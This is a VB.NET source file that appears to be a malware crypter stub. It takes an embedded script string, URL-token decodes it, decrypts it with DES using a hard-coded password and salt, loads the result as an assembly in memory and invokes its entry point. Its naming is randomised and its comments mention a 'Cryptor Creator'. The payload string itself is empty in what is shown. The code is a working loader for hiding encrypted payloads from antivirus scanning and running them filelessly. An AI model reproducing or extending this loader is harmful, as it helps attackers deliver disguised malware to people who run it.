Imports System.Security.Cryptography
Imports System.IO
Imports System.Web
Imports System.Text
Imports System
Imports Microsoft.VisualBasic
Imports System.Reflection
Imports System.Runtime.InteropServices
Imports Microsoft.Win32
Imports System.Net
Imports System.Windows
Imports System.Windows.Forms
Imports System.IO.Compression
Imports System.Diagnostics
Imports System.Collections
Imports System.Collections.Generic
Imports System.Threading
Imports System.Security.AccessControl
Imports System.ComponentModel
Imports System.Security.Principal
Imports System.Globalization

Module OcYjzPUtJkNbLOABqYvNbvhZf
    Dim Script As String
    Sub Main()

        Dim variable_array() As Object = New System.Object()
        variable_array(0) = { new Object }
        Try
            System.Threading.Thread.GetDomain.Load(Decode(Script)).EntryPoint.Invoke(0, variable_array)
        Catch ex As Exception
            MessageBox.Show(ex.GetBaseException().ToString())
        End Try
    End Sub
    Public Function Decode(ByVal Data As String) As Byte()
        Dim CryptoService As New DESCryptoServiceProvider
        Dim Bytes() As Byte
        '
        'Cryptor Creator
        Dim Salt() As Byte = New Byte() {1, 2, 3, 4, 5, 6, 7, 8, 9, 0}
        Dim CrypterKey As New Rfc2898DeriveBytes("MkhMoOHCbGUMqtnRDJKnBYnOj", Salt)
        CryptoService.Key = CrypterKey.GetBytes(CryptoService.Key.Length)
        CryptoService.IV = CrypterKey.GetBytes(CryptoService.IV.Length)
        Dim MemoryStream As New MemoryStream
        Dim Cryptor As New CryptoStream(MemoryStream, CryptoService.CreateDecryptor(), CryptoStreamMode.Write)
        '
        'Decode first URL encode
        Bytes = System.Web.HttpServerUtility.UrlTokenDecode(Data)
        '
        'Decrypt code
        Cryptor.Write(Bytes, 0, Bytes.Length)
        Cryptor.Close()
        '
        '
        Data = UnicodeEncoding.BigEndianUnicode.GetString(MemoryStream.ToArray)
        '
        '
        Dim s As Byte() = System.Web.HttpServerUtility.UrlTokenDecode(Data)
        Return s
    End Function
End Module
